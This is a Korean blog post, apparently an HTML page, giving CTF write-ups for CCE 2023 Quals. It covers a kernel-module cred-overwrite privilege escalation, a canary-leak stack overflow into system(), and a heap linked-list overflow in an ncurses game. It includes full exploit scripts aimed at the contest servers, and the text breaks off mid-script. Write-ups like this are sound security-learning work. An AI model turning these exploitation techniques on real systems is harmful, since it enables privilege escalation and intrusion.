<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>CCE 2023 Quals | msh1307</title>
<meta name="keywords" content="CCE 2023 Junior Quals, CCE 2023">
<meta name="description" content="K-Exploit 처음으로 잡아본 커널 문제다. 대회끝나고 50분뒤에 플래그가 나왔다. 아침에 BoB 필기랑 인적성보고 풀려했는데, 대회가 너무 빨리 끝났다. ;;
Analysis rootfs.img.gz 파일 시스템이 주어지고 bzImage가 주어진다.
local_run.sh #!/bin/sh qemu-system-x86_64 \ -m 128M \ -cpu kvm64,&#43;smep,&#43;smap \ -kernel bzImage \ -initrd rootfs.img.gz \ -snapshot \ -nographic \ -monitor /dev/null \ -no-reboot \ -append &#34;console=ttyS0 kaslr kpti=1 quiet panic=1&#34; \ -s kaslr, kpti, smep, smap 다 빡세게 걸려있다.
server_run.sh #!/bin/sh qemu-system-x86_64 \ -m 128M \ -cpu kvm64,&#43;smep,&#43;smap \ -kernel bzImage \ -initrd $1 \ -snapshot \ -nographic \ -monitor /dev/null \ -no-reboot \ -append &#34;console=ttyS0 kaslr kpti=1 quiet panic=1&#34; 똑같은데 디버깅 옵션만 빠진거같다.">
<meta name="author" content="">
<link rel="canonical" href="https://msh1307.kr/blog/cce_2023_junior_quals/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.min.d9c43e0c7cae3b38c51e79921ad3cf2685d9811a56593a817d9b57ac4fdebf2b.css" integrity="sha256-2cQ&#43;DHyuOzjFHnmSGtPPJoXZgRpWWTqBfZtXrE/evys=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.min.b95bacdc39e37a332a9f883b1e78be4abc1fdca2bc1f2641f55e3cd3dabd4d61.js" integrity="sha256-uVus3DnjejMqn4g7Hni&#43;Srwf3KK8HyZB9V4809q9TWE="
    onload="hljs.initHighlightingOnLoad();"></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-BR89V2WEC0"></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-BR89V2WEC0');
</script>
<link rel="icon" href="https://msh1307.kr/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://msh1307.kr/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://msh1307.kr/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://msh1307.kr/apple-touch-icon.png">
<link rel="mask-icon" href="https://msh1307.kr/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="CCE 2023 Quals" />
<meta property="og:description" content="K-Exploit 처음으로 잡아본 커널 문제다. 대회끝나고 50분뒤에 플래그가 나왔다. 아침에 BoB 필기랑 인적성보고 풀려했는데, 대회가 너무 빨리 끝났다. ;;
Analysis rootfs.img.gz 파일 시스템이 주어지고 bzImage가 주어진다.
local_run.sh #!/bin/sh qemu-system-x86_64 \ -m 128M \ -cpu kvm64,&#43;smep,&#43;smap \ -kernel bzImage \ -initrd rootfs.img.gz \ -snapshot \ -nographic \ -monitor /dev/null \ -no-reboot \ -append &#34;console=ttyS0 kaslr kpti=1 quiet panic=1&#34; \ -s kaslr, kpti, smep, smap 다 빡세게 걸려있다.
server_run.sh #!/bin/sh qemu-system-x86_64 \ -m 128M \ -cpu kvm64,&#43;smep,&#43;smap \ -kernel bzImage \ -initrd $1 \ -snapshot \ -nographic \ -monitor /dev/null \ -no-reboot \ -append &#34;console=ttyS0 kaslr kpti=1 quiet panic=1&#34; 똑같은데 디버깅 옵션만 빠진거같다." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://msh1307.kr/blog/cce_2023_junior_quals/" /><meta property="article:section" content="blog" />
<meta property="article:published_time" content="2023-06-10T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2023-06-10T00:00:00&#43;00:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="CCE 2023 Quals"/>
<meta name="twitter:description" content="K-Exploit 처음으로 잡아본 커널 문제다. 대회끝나고 50분뒤에 플래그가 나왔다. 아침에 BoB 필기랑 인적성보고 풀려했는데, 대회가 너무 빨리 끝났다. ;;
Analysis rootfs.img.gz 파일 시스템이 주어지고 bzImage가 주어진다.
local_run.sh #!/bin/sh qemu-system-x86_64 \ -m 128M \ -cpu kvm64,&#43;smep,&#43;smap \ -kernel bzImage \ -initrd rootfs.img.gz \ -snapshot \ -nographic \ -monitor /dev/null \ -no-reboot \ -append &#34;console=ttyS0 kaslr kpti=1 quiet panic=1&#34; \ -s kaslr, kpti, smep, smap 다 빡세게 걸려있다.
server_run.sh #!/bin/sh qemu-system-x86_64 \ -m 128M \ -cpu kvm64,&#43;smep,&#43;smap \ -kernel bzImage \ -initrd $1 \ -snapshot \ -nographic \ -monitor /dev/null \ -no-reboot \ -append &#34;console=ttyS0 kaslr kpti=1 quiet panic=1&#34; 똑같은데 디버깅 옵션만 빠진거같다."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Blogs",
      "item": "https://msh1307.kr/blog/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "CCE 2023 Quals",
      "item": "https://msh1307.kr/blog/cce_2023_junior_quals/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CCE 2023 Quals",
  "name": "CCE 2023 Quals",
  "description": "K-Exploit 처음으로 잡아본 커널 문제다. 대회끝나고 50분뒤에 플래그가 나왔다. 아침에 BoB 필기랑 인적성보고 풀려했는데, 대회가 너무 빨리 끝났다. ;;\nAnalysis rootfs.img.gz 파일 시스템이 주어지고 bzImage가 주어진다.\nlocal_run.sh #!/bin/sh qemu-system-x86_64 \\ -m 128M \\ -cpu kvm64,+smep,+smap \\ -kernel bzImage \\ -initrd rootfs.img.gz \\ -snapshot \\ -nographic \\ -monitor /dev/null \\ -no-reboot \\ -append \u0026#34;console=ttyS0 kaslr kpti=1 quiet panic=1\u0026#34; \\ -s kaslr, kpti, smep, smap 다 빡세게 걸려있다.\nserver_run.sh #!/bin/sh qemu-system-x86_64 \\ -m 128M \\ -cpu kvm64,+smep,+smap \\ -kernel bzImage \\ -initrd $1 \\ -snapshot \\ -nographic \\ -monitor /dev/null \\ -no-reboot \\ -append \u0026#34;console=ttyS0 kaslr kpti=1 quiet panic=1\u0026#34; 똑같은데 디버깅 옵션만 빠진거같다.",
  "keywords": [
    "CCE 2023 Junior Quals", "CCE 2023"
  ],
  "articleBody": "K-Exploit 처음으로 잡아본 커널 문제다. 대회끝나고 50분뒤에 플래그가 나왔다. 아침에 BoB 필기랑 인적성보고 풀려했는데, 대회가 너무 빨리 끝났다. ;;\nAnalysis rootfs.img.gz 파일 시스템이 주어지고 bzImage가 주어진다.\nlocal_run.sh #!/bin/sh qemu-system-x86_64 \\ -m 128M \\ -cpu kvm64,+smep,+smap \\ -kernel bzImage \\ -initrd rootfs.img.gz \\ -snapshot \\ -nographic \\ -monitor /dev/null \\ -no-reboot \\ -append \"console=ttyS0 kaslr kpti=1 quiet panic=1\" \\ -s kaslr, kpti, smep, smap 다 빡세게 걸려있다.\nserver_run.sh #!/bin/sh qemu-system-x86_64 \\ -m 128M \\ -cpu kvm64,+smep,+smap \\ -kernel bzImage \\ -initrd $1 \\ -snapshot \\ -nographic \\ -monitor /dev/null \\ -no-reboot \\ -append \"console=ttyS0 kaslr kpti=1 quiet panic=1\" 똑같은데 디버깅 옵션만 빠진거같다.\nk-exploit.ko _fentry__(flip, cmd); copy_from_user(index, usr_, 0x20LL); if ( (_DWORD)cmd == 0x10002 ) // modify { idx = 2 * *(_DWORD *)index; if ( (unsigned int)(2 * *(_DWORD *)index) \u003e 0x28 ) _ubsan_handle_out_of_bounds(\u0026off_BA0, idx); v11 = arr[idx]; if ( !v11 ) return -1LL; cnt = sz; if ( sz \u003e (unsigned __int64)arr[idx + 1] ) return -1LL; from_ = src; to_ = v11 + 8 * off; if ( (unsigned __int64)sz \u003e 0x7FFFFFFF ) BUG(); goto LABEL_26; // copy_from_user(to_, from_, cnt); } ioctl로 modify 할 수 있다. 구조체를 userland에서 받아서 그걸 바탕으로 처리를 진행한다.\nif ( (unsigned int)cmd \u003e 0x10002 ) { if ( (_DWORD)cmd == 0x10003 ) // CREATE { v15 = 2 * *(_DWORD *)index; if ( (unsigned int)(2 * *(_DWORD *)index) \u003e 0x28 ) _ubsan_handle_out_of_bounds(\u0026off_B80, v15); v6 = arr[v15]; if ( v6 ) { return -1LL; } else if ( (unsigned __int64)sz \u003e 0xA0 ) { return -1LL; } else { to = _kmalloc(sz, 0x6000C0LL); if ( to ) { arr[v15] = to; if ( (unsigned __int64)sz \u003e 0x7FFFFFFF ) BUG(); copy_from_user(to, src, sz); arr[v15 + 1] = sz; } else { return -1LL; } } } kmalloc을 한다.\nelse if ( (_DWORD)cmd == 0x10004 ) // DELETE { v4 = 2 * *(_DWORD *)index; if ( (unsigned int)(2 * *(_DWORD *)index) \u003e 0x28 ) _ubsan_handle_out_of_bounds(\u0026off_B60, v4); v5 = arr[v4]; if ( v5 ) { kfree(v5); arr[v4] = 0LL; return 0LL; } else { return -1LL; } } else { return 0LL; } return v6; } 얘는 kfree하는데 사용한다.\nif ( (_DWORD)cmd != 0x1337 ) { if ( (_DWORD)cmd != 0x10001 ) return 0LL; v8 = 2 * *(_DWORD *)index; if ( (unsigned int)(2 * *(_DWORD *)index) \u003e 0x28 ) _ubsan_handle_out_of_bounds(\u0026off_BC0, v8); usr = arr[v8]; if ( !usr ) return -1LL; if ( sz \u003e (unsigned __int64)arr[v8 + 1] ) return -1LL; if ( (unsigned __int64)sz \u003e 0x7FFFFFFF ) BUG(); copy_to_user(src, usr + 8 * off); return 0LL; } v17 = 2 * *(_DWORD *)index; if ( (unsigned int)(2 * *(_DWORD *)index) \u003e 0x27 ) _ubsan_handle_out_of_bounds(\u0026off_B40, v17); v6 = arr[v17]; if ( v6 ) { cnt = sz; from_ = src; to_ = *(_QWORD *)(v6 + 8 * off); if ( (unsigned __int64)sz \u003e 0x7FFFFFFF ) BUG(); LABEL_26: copy_from_user(to_, from_, cnt); 0x1337은 포인터 참조 두번하고 userland의 데이터로 덮는다. 0x1001은 메모리를 읽어주고 userland로 돌려준다.\nimport hashlib import base64 from pwn import * REMOTE_IP = \"20.196.194.8\" REMOTE_PORT = 1234 EXPLOIT_URL = b\"??\" io = remote(REMOTE_IP, REMOTE_PORT) def solvepow(x, target): x = bytes.fromhex(x) target = bytes.fromhex(target) for i in range(256**3): if hashlib.md5(x + i.to_bytes(3, \"big\")).digest() == target: return x.hex()+hex(i)[2:] def main(): line = io.recvuntil(b\"\\n\") x = line.split(b\"= \")[1][:26].decode(\"utf-8\") target = line.split(b\"= \")[2][:32].decode(\"utf-8\") io.recvuntil(b\": \") io.sendline(bytes(solvepow(x, target), \"utf-8\")) io.recvuntil(b\"link\\n\") io.sendline(b\"1\") io.recvuntil(b\": \") f = open(\"./a.out\", \"rb\") data = base64.b64encode(f.read()) f.close() io.sendline(data) # io.sendline(EXPLOIT_URL) io.interactive() return if __name__ == '__main__': main() 이거 때문에 브포하기 힘들다.\nExploitation ~ # cat /proc/slabinfo | grep cred cred_jar 105 105 192 21 1 : tunables 0 0 0 : slabdata 5 5 0 slab info 확인해서 cred 크기 확인해보면, 0xc0이라서 잘 맞추고 스프레이하고 인접한 cred를 덮으려고 했는데 막혀있다. UAF도 불가능하다.\nif ( sz \u003e (unsigned __int64)arr[idx + 1] ) return -1LL; from_ = src; to_ = v11 + 8 * off; if ( (unsigned __int64)sz \u003e 0x7FFFFFFF ) BUG(); goto LABEL_26; // copy_from_user(to_, from_, cnt); if ( sz \u003e (unsigned __int64)arr[v8 + 1] ) return -1LL; if ( (unsigned __int64)sz \u003e 0x7FFFFFFF ) BUG(); copy_to_user(src, usr + 8 * off); return 0LL; off 검증이 없다. 원래 0x1337이나 0x1001도 있는데 어떤 곳에 사용해야할지 잘 모르겠고 시간도 부족해서, 간단하게 fork로 cred 구조체 heap spraying 하고 브포했다. 생각보다 엔트로피가 그렇게 크지 않아보여서 시도해봤는데, 막상 remote로 보낼때 pow_client.py 때문에 브포하기 힘들었다.\n/* Effective (overridable) subjective task credentials (COW): */ const struct cred __rcu\t*cred; #ifdef CONFIG_KEYS /* Cached requested key. */ struct key\t*cached_requested_key; #endif /* * executable name, excluding path. * * - normally initialized setup_new_exec() * - access it with [gs]et_task_comm() * - lock it with task_lock() */ char\tcomm[TASK_COMM_LEN]; 출제자분의 라이트업에서는 task_struct를 찾기 위해서 prctl PR_SET_NAME으로 이름을 바꿔주고 0x1001로 메모리를 읽으면서 그 문자열 위치를 탐색하고 문자열 위치 - 0x10 위치에 cred 구조체 포인터가 있으니까 0x1337로 참조해서 익스했다.\nExploit script #include #include #include #include #include #include #include #include struct ioctl_info { uint32_t idx; uint32_t dummy; uint64_t src; uint64_t sz; uint64_t off; }__attribute__((packed)); #define CREATE 0x10003 #define MODIFY 0x10002 #define DELETE 0x10004 int main() { int fd; struct ioctl_info io; if ((fd = open(\"/dev/K-exploit\", O_RDWR)) \u003c 0){ puts(\"ERR\"); exit(1); } io.idx = 0; char * buf = malloc(0xc0); strcpy(buf, \"DEADBEEF0\"); io.src = (int64_t)buf; io.sz = 0xa0; // cred if ((int)ioctl(fd, CREATE, \u0026io) \u003c 0){ io.idx =0; ioctl(fd, DELETE, \u0026io); if ((int)ioctl(fd, CREATE, \u0026io) \u003c 0){ puts(\"ERR\"); } } char * flag = malloc(0x40); int fl = 0; int pid[0x100]; for(int i =0;i\u003c0x100;i++){ pid[i] = fork(); if (pid[i] == 0){ sleep(3); if (getuid() == 0){ fl = 0; puts(\"priv escalated\"); int f = open(\"/flag\",O_RDONLY); printf(\"%d\",f); read(f, flag,0x40); puts(flag); } exit(0); } else if (pid[i] == -1){ puts(\"fork error\"); } } memcpy(buf,\"\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\",40); int v; for (int i=0;i\u003c 30;i++){ io.off = (0xac480-0xc0*10)/0x8 + i; io.sz = 40; if ((int)ioctl(fd, MODIFY, \u0026io) \u003c 0){ puts(\"ERR\"); exit(1); } puts(\"trying\"); } int status; wait(\u0026status); close(fd); if(fl == 0){ puts(\"NOPE\"); } return 0; } cce2023{y0u_kn0w_Linux_k3rn3l_3xploit?}\nn0t_rand0m Analysis setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); puts(\"what your name?\"); read(0, buf, 8uLL); printf(\"Hello %s\", buf); puts(\"write comment\"); read(0, comment, 0x18uLL); v3 = time(0LL); srand(v3); while ( 1 ) { while ( 1 ) { nbytes_4 = rand() % 9 + 1; printf(\"random number : %d\\n\", nbytes_4); printf(\"continue? (yes or no) \"); read(0, haystack, 8uLL); if ( strstr(haystack, \"no\") ) break; if ( !strstr(haystack, \"yes\") ) exit(1); } switch ( nbytes_4 ) { case 1u: printf(\"comment : %s\\n\", comment); continue; case 2u: printf(\"name : %s\\n\", buf); continue; case 3u: puts(\"write new comment\"); read(0, comment, nbytes); continue; case 4u: puts(\"write new name\"); read(0, buf, nbytes); continue; case 5u: nbytes = strlen(comment); printf(\"%d\\n\", nbytes); continue; case 6u: nbytes = strlen(buf); printf(\"%d\\n\", nbytes); continue; case 7u: sub_401296(nbytes); goto LABEL_15; case 8u: sub_401345(nbytes); goto LABEL_15; case 9u: LABEL_15: exit(1); case 0xAu: sub_4013B1(buf); break; default: continue; } } } unsigned __int64 __fastcall sub_401296(unsigned int a1) { char buf[8]; // [rsp+18h] [rbp-28h] BYREF char v3[24]; // [rsp+20h] [rbp-20h] BYREF unsigned __int64 v4; // [rsp+38h] [rbp-8h] v4 = __readfsqword(0x28u); puts(\"one more time what your name\"); read(0, buf, a1); printf(\"ok %s\\n\", buf); puts(\"did you have fun?\"); read(0, v3, a1); puts(\"ok...bye\"); return v4 - __readfsqword(0x28u); } int __fastcall sub_4013B1(const char *a1) { return system(a1); } 일반적으로는 %9 + 1 때문에 0xa에는 접근할 수 없다.\nExploitation char buf[8]; // [rsp+8h] [rbp-28h] BYREF char comment[24]; // [rsp+10h] [rbp-20h] BYREF comment와 buf가 인접해있다.\ncase 5u: nbytes = strlen(comment); printf(\"%d\\n\", nbytes); continue; case 6u: nbytes = strlen(buf); printf(\"%d\\n\", nbytes); nbytes를 strlen으로 늘릴 수 있다. 인접해있기에 strlen(buf)로 늘려주면 nbytes를 늘릴 수 있다.\nsub_401296타고 들어가서 canary leak하고 ret를 system 쪽으로 뛰면 된다.\nExploit script from pwn import * from ctypes import CDLL e = ELF('./n0t_rand0m') libc = ELF(\"./libc.so.6\") #p = process('./n0t_rand0m',env={\"LD_PRELOAD\":\"./libc.so.6\"}) p = remote(\"20.196.192.95\",8888) context.log_level='debug' def func(n): while True: rvu(b'random number : ') r = int(rvl()[:-1]) if r == n: sa(b'continue? (yes or no)',b'no') break else: sa(b'continue? (yes or no)',b'yes') sa = lambda x,y : p.sendafter(x,y) rvu = lambda x : p.recvuntil(x) rvl = lambda : p.recvline() sa(b'what your name?',b'A'*8) rvu(b\"A\"*8) # stack = u64(rvu(b\"\\x7f\").ljust(8,b'\\x00')) # success(hex(stack-0x2b1)) # local leak sa(b'write comment',b'A'*0x18) func(2) func(6) func(3) sa(b'write new comment',b'A'*0x20) func(6) func(3) sa(b'write new comment',b'A'*0x28) func(6) func(1) rvu(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA') l =u64(rvu(b'\\x7f').ljust(8,b'\\x00')) #remote leak success(hex(l)) # func(4) # sa(b'write new name',b'sh\\x00') # func(7) # sa(b'one more time what your name',b'A'*0x21) # rvu(b'A'*0x21) # can = b'\\x00'+p.recv(7) # sa(b'did you have fun?',b'A'*0x18 + can +p64(stack-0x2b1+0x28)+p64(0x04016B0)) func(7) sa(b'one more time what your name',b'A'*0x21) rvu(b'A'*0x21) can = b'\\x00'+p.recv(7) sa(b'did you have fun?',b'A'*0x18 + can +p64(l + 0x1ae908 + 0x28)+p64(0x04016B0)) p.interactive() 로컬에선 릭이 됐는데, 리모트에선 안되길래 그냥 따로 릭을 진행했다. cce2023{c306445363ca0d34c2fd4ba6e2da5ea19052ae855d00b3b46bc71785d16db14542d944d41934e2bcdab0816a154a8872b1258334cbc2f2672004db5a}\nFit 이건 대회끝나고 보니까 솔버나왔길래 궁금해서 풀어봤다.\nAnalysis __int64 __fastcall main(int a1, char **a2, char **a3) { unsigned int v3; // eax v3 = time(0LL); srand(v3); initscr(); raw(); curs_set(1); resizeterm(25, 80); cbreak(); keypad(stdscr, 1); noecho(); go(); endwin(); echo(); return 0LL; } ncurses 냄새가 난다.\nv11 = __readfsqword(0x28u); clock_gettime(1, \u0026tp); clock_gettime(1, \u0026v6); memset(rand_char, 0, sizeof(rand_char)); v8 = 0; memset(input_, 0, sizeof(input_)); v10 = 0; stage_ = 1; v3 = 0; get_rand_char_20(rand_char); render_screen(1u, 0, rand_char, (const char *)input_); while ( 1 ) { do { while ( 1 ) { while ( 1 ) { v4 = wgetch(stdscr); if ( v4 == -1 ) goto LABEL_18; if ( (v4 \u003c= '@' || v4 \u003e 'a') \u0026\u0026 (v4 \u003c= '`' || v4 \u003e 'z') \u0026\u0026 (v4 \u003c= '/' || v4 \u003e '9') ) break; if ( v3 \u003c= 19 ) *((_BYTE *)input_ + v3++) = v4; } if ( v4 != 0x107 ) break; if ( v3 \u003e 0 ) --v3; *((_BYTE *)input_ + v3) = 0; wclear(qword_5250); } } while ( v4 != 0x157 \u0026\u0026 v4 != '\\n' ); // get_by_line LABEL_18: if ( v4 == 343 || v4 == 10 ) break; LABEL_24: get_time(\u0026v6); render_screen(stage_, LODWORD(v6.tv_sec) - LODWORD(tp.tv_sec), rand_char, (const char *)input_); } if ( memcmp(input_, rand_char, 20uLL) ) // not correct -\u003e go input again { LABEL_23: wclear(qword_5250); memset(input_, 0, 20uLL); v3 = 0; goto LABEL_24; } if ( ++stage_ != 6 ) { get_rand_char_20(rand_char); goto LABEL_23; } clock_gettime(1, \u0026v6); *game_struct = v6.tv_sec - tp.tv_sec; // time if ( v6.tv_nsec \u003e= tp.tv_nsec ) { game_struct[1] = v6.tv_nsec - tp.tv_nsec; } else { --*game_struct; game_struct[1] = v6.tv_nsec + 1000000000 - tp.tv_nsec; } return v11 - __readfsqword(0x28u); } 랜덤으로 문자열 뽑아서 입력된 문자열과 비교한다.\n_BOOL8 __fastcall retry_(__int64 *game_struct) { int i; // [rsp+10h] [rbp-10h] int v3; // [rsp+14h] [rbp-Ch] _QWORD *v4; // [rsp+18h] [rbp-8h] register_game_result(game_struct); // heap leak next node pointer leak vulnerabililty wclear(stdscr); wborder( stdscr, (unsigned int)dword_5200, (unsigned int)dword_5200, (unsigned int)dword_51E4, (unsigned int)dword_51E4, 0LL, 0LL, 0LL, 0LL); wmove(stdscr, 2, 38); printw(\"Record\"); v4 = (_QWORD *)start_res_block[5]; for ( i = 0; i \u003c= 4; ++i ) { wmove(stdscr, 3 * i + 5, 7); printw(\"%d.\", (unsigned int)(i + 1)); if ( v4 ) // block + 0x28 -\u003e 0 { wmove(stdscr, 3 * i + 5, 11); printw(\"%s\", (const char *)v4 + 0x10); // heap leak vuln trigger wmove(stdscr, 3 * i + 5, 52); printw(\"%ld.%ld\", *v4, v4[1]); v4 = (_QWORD *)v4[5]; // AAR ? next pointer can be overflowed } } wmove(stdscr, 20, 34); echo(); printw(\"Retry(y/N)?\"); v3 = wgetch(stdscr); noecho(); return v3 != 'y'; } 한판 끝나고 결과 저장해주고, 더 할건지 묻는다.\n0LL); wmove(stdscr, 5, 37); printw(\"Result\"); wmove(stdscr, 9, 30); printw(\"Passed Time: %ld.%ld\", *game_struct, game_struct[1]); wmove(stdscr, 13, 20); printw(\"Name: \"); wrefresh(stdscr); echo(); game_res_struct_malloc = (__int64 *)malloc(0x30uLL); *game_res_struct_malloc = *game_struct; game_res_struct_malloc[1] = game_struct[1]; game_res_struct_malloc[5] = 0LL; read(0, game_res_struct_malloc + 2, 0x20uLL); noecho(); if ( current_res_block ) current_res_block[5] = (__int64)game_res_struct_malloc; else start_res_block[5] = game_res_struct_malloc; result = (unsigned __int64)game_res_struct_malloc; current_res_block = game_res_struct_malloc; } return result; } 이름을 기록한다. singly linked list로 저장한다.\nwmove(stdscr, 13, 20); printw(\"Name index: \"); wrefresh(stdscr); echo(); scanw(\"%d\", \u0026idx); wclear(stdscr); wborder( stdscr, (unsigned int)dword_5200, (unsigned int)dword_5200, (unsigned int)dword_51E4, (unsigned int)dword_51E4, 0LL, 0LL, 0LL, 0LL); noecho(); wmove(stdscr, 13, 20); printw(\"Name: \");\twrefresh(stdscr); echo(); v3 = read(0, NAME, 0x14uLL); NAME[v3 - 1] = 0; noecho(); for ( i = 0; i \u003c idx; ++i ) { if ( !v4 ) return v7 - __readfsqword(0x28u); v5 = v4; v4 = (__int64 *)v4[5]; // next ptr } if ( v4 ) // if exists { memcpy(v4 + 2, NAME, 0x14uLL); // name rewriting? AAW trigger? puts((const char *)v5 + 0x10); // print_name? } return v7 - __readfsqword(0x28u); } 게임 끝나고 ‘y’가 아니라면 실행되는 함수다. idx 받고 이름 다시 써준다.\nExploitation 취약점은 대놓고 주는데, 익스가 오래걸렸다. I/O가 이상해서 pyte 터미널 에뮬레이터를 활용했다.\ngame_res_struct_malloc = (__int64 *)malloc(0x30uLL); *game_res_struct_malloc = *game_struct; game_res_struct_malloc[1] = game_struct[1]; game_res_struct_malloc[5] = 0LL; read(0, game_res_struct_malloc + 2, 0x20uLL); 경계 체크가 미흡해서 다음 노드를 가리키는 포인터를 덮을 수 있다.\necho(); game_res_struct_malloc = (__int64 *)malloc(0x30uLL); *game_res_struct_malloc = *game_struct; 초기화가 하지 않아서 UAF를 트리거할 수 있다.\nwmove(stdscr, 2, 38); printw(\"Record\"); v4 = (_QWORD *)start_res_block[5]; for ( i = 0; i \u003c= 4; ++i ) { wmove(stdscr, 3 * i + 5, 7); printw(\"%d.\", (unsigned int)(i + 1)); if ( v4 ) // block + 0x28 -\u003e 0 { wmove(stdscr, 3 * i + 5, 11); printw(\"%s\", (const char *)v4 + 0x10); // heap leak vuln trigger wmove(stdscr, 3 * i + 5, 52); printw(\"%ld.%ld\", *v4, v4[1]); v4 = (_QWORD *)v4[5]; // AAR ? next pointer can be overflowed } } wmove(stdscr, 20, 34); 출력해줘서 여기서 릭하면 된다.\n__int64 printw(__int64 a1, ...) { __va_list_tag va[1]; // [rsp+0h] [rbp-D8h] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-C0h] va_start(va, a1); v3 = __readfsqword(0x28u); return vw_printw((__int64)stdscr, a1, (__int64)va); } __int64 __fastcall vw_printw(__int16 *a1, __int64 a2, __int64 a3) { __int64 v4; // rax unsigned __int8 *v5; // rax v4 = _nc_screen_of(a1); v5 = (unsigned __int8 *)sub_189A0(v4, a2, a3); if ( v5 ) return waddnstr(a1, v5, -1); else return 0xFFFFFFFFLL; } goto LABEL_54; return v23; } v51 = string; v6 = v5 + (_DWORD)string + 1; while ( 1 ) { ++v51; v7 = _nc_screen_of(a1); v8 = (unsigned __int8 *)unctrl_sp(v7, v3); if ( !v8[1] || (v9 = __ctype_b_loc(), ((*v9)[v3] \u0026 0x4002) == 0x4000) ) { v25 = *((_DWORD *)a1 + 4); v26 = a1[1]; v27 = *((_DWORD *)a1 + 5); v28 = a1[1]; v29 = BYTE1(v25); char *__fastcall unctrl_sp(__int64 a1, unsigned __int8 a2) { int v2; // eax int v3; // eax __int64 v5; // rax const unsigned __int16 **v6; // r8 if ( a1 ) { v2 = *(_DWORD *)(a1 + 1496); if ( v2 \u003e 1 ) { v3 = a2 - 128; if ( (unsigned int)v3 \u003c= 0x1F || (unsigned int)a2 - 160 \u003c= 0x5F ) return (char *)\u0026unk_293A0 + word_297C0[v3]; goto LABEL_7; } if ( (unsigned int)a2 - 160 \u003c= 0x5F ) { if ( v2 != 1 ) { if ( v2 ) goto LABEL_7; v6 = __ctype_b_loc(); v5 = a2; if ( ((*v6)[a2] \u0026 0x4000) == 0 ) return (char *)\u0026unk_293A0 + *((__int16 *)\u0026off_291A0 + v5); } v3 = a2 - 128; return (char *)\u0026unk_293A0 + word_297C0[v3]; } } LABEL_7: v5 = a2; return (char *)\u0026unk_293A0 + *((__int16 *)\u0026off_291A0 + v5); } 특정 범위에 안걸리면 릭이 제대로 되서 간단하게 제대로 된 주소 나올때까지 반복적으로 시도하면 바로 익스할 수 있었지만, printw의 출력 로직을 분석해서 한번에 익스플로잇되도록 만들었다. 겹치는 부분이 생겨서 가짓수가 꽤 나오기 때문에 백트레킹해서 주소가 제대로 나왔는지 확인했다.\n이후 AAW로 잘 덮고, 마저 익스했다.\nExploit script from pwn import * import pyte DEBUG = True context.terminal=['tmux', 'splitw', '-h'] context.binary = e = ELF('./fit') libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6') off = [0x2000, 0x25D0] # 0x2000, 0x0002346 script = '' for i in off: script += f'brva {hex(i)}\\n' if DEBUG: p = gdb.debug(e.path, gdbscript=script) else : p = process(e.path) dims = (80, 25) screen = pyte.Screen(*dims) stream = pyte.ByteStream(screen) sl = lambda x : p.sendline(x) s = lambda x : p.send(x) def feed_stream() -\u003e str: global stream,screen stream.feed(p.recv(2000)) scr = '' for i in screen.display: scr += str(i) + '\\n' return scr def rvuntil(b : bytes) -\u003e bytes: for i in range(20): rv = p.recv(2000,timeout=1) sleep(0.01) if b in rv: break return rv def solve(st) -\u003e int: scr = feed_stream().split() try: ans = (scr[scr.index('Word:')+2]) stage = int(scr[scr.index('Stage')+1]) sl(ans) if stage != st: return solve(st) except: return solve(st) return stage ctype_loc = [0x0002, 0x0002,0x0002,0x0002,0x0002,0x0002,0x0002,0x0002,0x0002,0x2003, 0x2002,0x2002, 0x2002, 0x2002,0x0002, 0x0002, 0x0002, 0x0002,0x0002,0x0002, 0x0002,0x0002,0x0002,0x0002,0x0002, 0x0002, 0x0002, 0x0002,0x0002,0x0002,0x0002,0x0002,0x6001, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xd808, 0xd808, 0xd808, 0xd808, 0xd808, 0xd808, 0xd808, 0xd808, 0xd808, 0xd808, 0xc004, 0xc004, 0xc004, 0xc004, 